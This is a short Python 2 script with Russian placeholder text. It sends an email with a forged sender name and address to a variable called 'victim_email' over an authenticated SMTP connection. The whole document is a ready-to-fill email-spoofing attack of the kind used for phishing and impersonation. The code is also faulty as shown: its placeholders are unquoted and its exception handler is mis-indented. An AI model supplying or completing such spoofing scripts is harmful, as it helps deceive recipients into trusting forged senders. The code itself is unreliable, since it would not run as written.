import smtplib
sender_email = [e-mail отправителя]
username = [имя аккаунта smtp]
password = [Ваш пароль SMTP]
spoofed_email = [ненастоящий e-mail адрес]
spoofed_name = 'John Doe'
victim_email = [e-mail адрес жертвы]
subject= "Это тема\n"
body = "This is a body."
header = ('To:' + victim_email + '\n' +'From: ' + spoofed_name + ' <' +
spoofed_email + '>' + '\n' + 'Subject:' + subject)
message = (header + '\n\n' + body + '\n\n')
try:
  session = smtplib.SMTP_SSL([домен smtp-сервера],[номер порта smtp-сервера])
  session.ehlo()
  session.login(username, password)
  session.sendmail(sender_email, victim_email, message)
  session.quit()
  print "Email Sent With Success!"
  except smtplib.SMTPException:
  print "Error: Unable To Send The Email!"
